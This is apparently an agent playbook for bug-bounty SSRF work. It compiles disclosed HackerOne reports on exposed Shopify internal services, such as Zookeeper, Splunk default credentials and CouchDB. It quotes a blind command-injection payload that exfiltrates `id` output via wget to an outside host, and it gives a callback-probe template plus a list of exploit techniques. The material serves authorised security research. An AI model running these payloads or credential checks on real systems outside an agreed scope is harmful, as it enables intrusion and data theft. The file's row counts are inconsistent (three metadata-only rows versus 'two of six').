---
title: "Internal Service Exposure — what an SSRF finds"
type: playbook
category: internal-service-exposure
cwe: "CWE-918"
source_count: 6
full_bodies_available: 3
corpus: "HackerOne disclosed reports, 2013–2017 era, h1.security.nathan.sx archive"
archive_accessed: "2026-10-24"
note: "These cases are not SSRF primitives. They are the class of finding that SSRF aims at. Three rows are metadata-level only (body withheld on unauthenticated retrieval)."
---

# Internal Service Exposure — what an SSRF finds

## 1. Overview

This file collects the corpus's *SSRF-flavoured-objectives* — reports where an
attacker reached an internal service of the target **without an SSRF chain at
all**, usually because the internal service was exposed to the internet
(shopify `*.ec2.*` hostnames in all three full-body cases) or lacked
authentication inside it. Their value to the SSRF vault:

1. They are the *impact inventory*: the exact kinds of things an internal
   network in this era contained and a good SSRF could find — coordination
   service (Zookeeper), indexer/monitor (Splunk), document store (CouchDB),
   test-target CMS, shared admin panels.
2. They carry market data on what these findings paid: the archive keeps
   `$1,000` (Zookeeper), `$500` (Splunk default creds), and `$3,000`
   (an RCE on one of these internal endpoints — archive bounty table).
3. They are excellent sitting targets for the "objective ladder": once an
   SSRF oracle exists, the agent's next question is *which internal services
   would be worth probing*, and this file is the era-sourced answer.

Honest class statement: none of the six rows is itself "SSRF". They are
recorded here in a dedicated file precisely so SSRF claims are never inflated
by borrowing their impact language.

## 2. Case evidence

### SRF-73567 — Attention! Remote Code Execution at http://wpt.ec2.shopify.com/ · Shopify — archive bounty **$3,000** (bounty field shows no value in the report JSON; $3,000 stands in the archive's bounty table)

- Link: <https://hackerone.com/reports/73567>
- Weakness label as recorded (historical): "Command Injection - Generic" — correct
  gene at least; the body is a blind RCE.
- Quote (the landing page and the payload — a shell substitution into an
  update form):
  > I just found a remote code execution bug at http://wpt.ec2.shopify.com/
  > 1. Open 
  > 2. In the text area enter  **$(`sleep 20`)** and hit "Update List"
  > 3. The result should come out at around 20 seconds, there-by executing sleep command *(sic — "there-by")*
- Quote (blind RCE proof architecture — exfil through the webserver's own logs):
  > POC:  http://wpt.ec2.shopify.com/testlog.php?days=1&amp;filter=%24%28%60wget+sandbox.prakharprasad.com%2F%24%28id%29%60%29
  and
  > I've attached a video for this RCE bug, in which I had executed **id** command for verification purpose on the server and sent back the result to my Apache logs, as the RCE here is blind.
- Why it belongs in an SSRF vault: the same `wget`-style live proof + the same
  listener-refresh receipt are what a *blind SSRF with RCE-side-effects* report
  expects. Keep this architecture; the presence-check step no longer needs the
  RCE — the SSRF version of this file is "callback from internal host received".

### SRF-154369 — Unauthorized access to Zookeeper on http://locutus-zk3.ec2.shopify.com:2181 · Shopify — **$1,000**

- Link: <https://hackerone.com/reports/154369>
- Weakness label as recorded (historical): "Improper Authentication - Generic".
- Quote (how such findings happen — external port scan, standard banner):
  > While scanning for Open ports on http://locutus-zk3.ec2.shopify.com, I came across port 2181. Grabbing the banner on this port revealed that it's running Zookeeper:
  > ```
  > Zookeeper version: 3.5.1-alpha-1693007, built on 07/28/2015 07:19 GMT
  > ```
- Quote (the admin-command escalation claim, verbatim):
  > Zookeeper installations does not deploy any authentication by default, this makes it very easy for remote attackers to abuse Zookeeper installations, gather information and cause havoc inside Zookeeper clusters by killing the servers (my tests showed that the kill command is available on this instance). After some testing, I found that I was able to run all the commands that are only allowed to be run by admins! Here is a sample of the commands I ran: *(sic — "installations does")*
- What the `dump` command returned (internal topology — the true treasure):
  > ephemeral nodes dump:
  > Sessions with Ephemerals (5):
  > 0x1053c5850800024:
  >         /borg/locutus/agents/061e4b6/10.92.1.192:9257
  > 0x1053c5850800023:
  >         /borg/locutus/agents/061e4b6/10.92.1.118:9257
  … and so on for 10.92.1.120, 10.92.1.87, 10.92.1.10 — five internal agent
  addresses and their ports, i.e. a live internal network map handed out by the
  service.
- `envi` query output details (exact system data): `java.version=1.7.0_79`,
  `java.vendor=Oracle Corporation`, the JVM classpath, etc. This matters for
  impact: the same ports talk back structured infrastructure secrets.

### SRF-158118 — Access to Splunk at https://apt.ec2.shopify.com:8089 · Shopify — **$500**

- Link: <https://hackerone.com/reports/158118>
- Weakness label as recorded: "None".
- Quote (complete finding, as terse as it reads):
  > Default Splunk admin credentials were found at  [https://apt.ec2.shopify.com:8089](https://apt.ec2.shopify.com:8089)
  > **Default credentials**
  > ```
  > login:admin
  > password:changeme
  > ```
  > *See pic 1 as POC*
- Note the reporter's own scope-confession — preserved because it is a useful
  triage-history record:
  > *Please let me know if you need some extra information.
  > Sorry if this report if out of scope, i thought it could be informative for you!* *(sic — "if this report if")*
  and it still paid $500.

### Metadata-only adjacent rows (body withheld; titles are the evidence)

These three are Shopify-era internal surface rows where the JSON returned no
body. Keep them at metadata level.

| Case | Title | Weakness (recorded) |
| --- | --- | --- |
| SRF-159536 | Open CouchDB on experiments.ec2.shopify.com:5984 | (not set) |
| SRF-165048 | Access to Splunk via shard3-db2.ec2.shopify.com endpoint | "Improper Authentication - Generic" |
| SRF-216389 | Full access at an internal service of Shopify | "Information Disclosure" |

All three names carry the same estate pattern as the full-body cases
(`*.ec2.*.shopify.com` internal naming, exposed Docker-orchestration-era
components). No further technical claim is possible without the body —
**"Not disclosed in the source"**.

## 3. What this file proves for the SSRF playbook

1. Internal estates in 2015-2017 held unauthenticated / default-credential /
   command-injection systems *reachable only via loopback or inside the network*
   — the very systems an SSRF's port oracle will find first (see Port-Scan file's
   bands). SRF-154369's own answer layout (`dump`, `envi`, `stat`, `ruok` — the
   Zookeeper API set) is a ready-made internal-service checklist.
2. Pursue three consequence classes in order: **topology disclosure** (dump /
   environ readback), **data/state manipulation** (kill exists — the author
   reported without running it, keep that discipline: "(Haven't tried this one)"
   against `kill` in the source), **RCE** (SRF-73567's shell substitution).
3. Attribution and listener patterns from SRF-73567 transfer to blind-SSRF writes
   (Blind-SSRF file).
4. The `$` amounts are eras: $500 default-creds on Splunk was the going rate for a
   2017 "internal surface" report; do not export the number again.
5. The era's own "what an SSRF finds and how it exploits it" answer sheet — Memcached
   gopher/dict/ldap triads, Zabbix `system.run[ls]` with `EnableRemoteCommands=1`,
   Postgres dblink, MongoDB `copyDatabase`, Redis `SLAVEOF`/`MIGRATE`, CouchDB
   `_replicate` relay — is recovered verbatim in [BLOG-002](references/blogs-index.md)
   ("SSRF bible. Cheatsheet" rev 1.03, 2017). This file's solved cases are the
   per-target instantiations of that catalog; keep both in hand when routing.

## 4. Agent execution template

### Context I1 — internal-service inventory during an SSRF session

Once port/address oracles exist (Port-Scan file), probe the service families this
file evidenced, in this order (they yielded era payoffs):

1. Coordination services: Zookeeper (2181) — banner text as in SRF-154369; then
   `dump`, `envi`, `stat`, `ruok` one at a time. Never issue state-changing
   commands (`kill`, `create`).
2. Index/monitor services: Splunk (8089) — check **default repo "admin/changeme"**
   only as a read-only test login; if landed, do not configure anything.
3. Document databases: CouchDB (5984) — only `_all_dbs`-style read probes.
4. Admin panels: VestaCP-style frontends (SRF-128685's `:8081` find lives in the
   Cloud-Metadata file's M3 context).
5. Record each banner + response verbatim; stop at observing, report.

### Context I2 — blind RCE-with-SSRF drill (only for scopes that allow it)

Model on SRF-73567's own architecture:
1. A time-delay probe (`$(sleep 20)` equivalent) for presence signal.
2. A call-back probe (`wget http://YOUR-LISTENER/$(id)` equivalent) to proof the
   execution context; the id-command item there came out through Apache access
   logs — plan your exfil-through-legitimate-logs channel the same way.
3. Only light probes, no destructive ops, no persistence; end at presence proof.

## 5. Validation gates

1. Do **not** import their impact language into an SSRF report: "RCE" claims
   belong to SRF-73567's own body; an SSRF report's ceiling is its own ceiling —
   state `which internal service is reachable`, not `full estate compromise`.
2. Read-only discipline throughout (SRF-154369's author explicitly did not run
   state-changing commands — quote that behaviour in your own reporting notes).
3. Do not execute insertion of commands into admin panels (I2) unless the
   engagement contract covers code-execution proving; otherwise the time-delay
   band stays at what it is: presence check.
4. Default-credential findings must record the *exact* credential pair proven to
   work, per SRF-158118's format, then stop.
5. Two of six rows are metadata-only; their presence is "exposure *existed* in the
   era estate" — not "reproducible technique".

## 6. Cross-file routing

| Finding shape | Route |
| --- | --- |
| Reach **loopback or internal port** through SSRF itself | Port-Scan-and-Internal-Mapping.md |
| Reach **host metadata service** | Cloud-Instance-Metadata.md |
| Reach a **live internal service** interactively (this file) | here, Context I1/I2 |
| Reach **media/file-read pipeline** | Media-Processing-SSRF.md |
